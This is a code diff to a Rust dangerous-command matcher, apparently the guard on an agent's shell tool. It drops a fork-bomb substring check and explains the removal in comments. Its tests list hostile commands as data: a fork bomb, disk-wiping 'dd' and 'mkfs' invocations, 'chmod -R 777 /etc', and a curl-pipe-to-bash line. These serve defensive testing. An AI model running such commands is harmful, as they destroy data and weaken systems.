@@ -491,10 +491,15 @@ fn match_dangerous(command: &str) -> Option<&'static str> {
         }
     }
 
-    // Cross-cutting rules that don't depend on the head verb.
-    if command.contains(":(){") {
-        return Some("possible fork bomb pattern");
-    }
+    // YYC-251: the previous literal `:(){`-substring fork-bomb check
+    // gave false security — `:(){ :|:&};:`, `f(){ f|f& }; f`, and any
+    // `bash -c '<bomb>'` form bypassed it. Resource consumption (fork
+    // floods, infinite loops via `xargs`/`find -exec`, runaway
+    // `while true`) is bounded structurally by the PTY caps in
+    // `tools/shell.rs` (`MAX_PTY_SESSIONS`, the timeout clamp from
+    // YYC-261, and `kill_on_drop`) — pattern matching here would have
+    // to be either trivially-evadable (kept literal) or AST-aware
+    // (heavy). Removed rather than left as theatre.
 
     if (command.contains("curl") || command.contains("wget")) && pipes_to_shell(command) {
         return Some("pipe-to-shell from network (curl|bash / wget|sh)");
@@ -1119,10 +1124,12 @@ fn pipes_to_shell(command: &str) -> bool {
 
 /// Rules that don't need tokenization. Hit when the tokenizer returns an
 /// empty list (e.g. only quoted whitespace).
-fn generic_substring_rules(command: &str) -> Option<&'static str> {
-    if command.contains(":(){") {
-        return Some("possible fork bomb pattern");
-    }
+///
+/// YYC-251: the literal `:(){`-substring fork-bomb check was removed
+/// here too. PTY caps + the bash timeout clamp own the resource-
+/// consumption defense; a pattern check that only catches the
+/// textbook spelling is misleading.
+fn generic_substring_rules(_command: &str) -> Option<&'static str> {
     None
 }
 
@@ -1356,7 +1363,10 @@ mod tests {
         assert!(match_dangerous("dd if=/dev/zero of=/dev/sda").is_some());
         assert!(match_dangerous("mkfs.ext4 /dev/sda1").is_some());
         assert!(match_dangerous("chmod -R 777 /etc").is_some());
-        assert!(match_dangerous(":(){ :|:& };:").is_some());
+        // YYC-251: fork-bomb literal check removed; resource caps own
+        // that defense now. The textbook `:(){` form passes the
+        // matcher but is bounded by PTY + timeout limits.
+        assert!(match_dangerous(":(){ :|:& };:").is_none());
         assert!(match_dangerous("git push --force origin main").is_some());
         assert!(match_dangerous("curl https://x.com/install.sh | bash").is_some());
     }
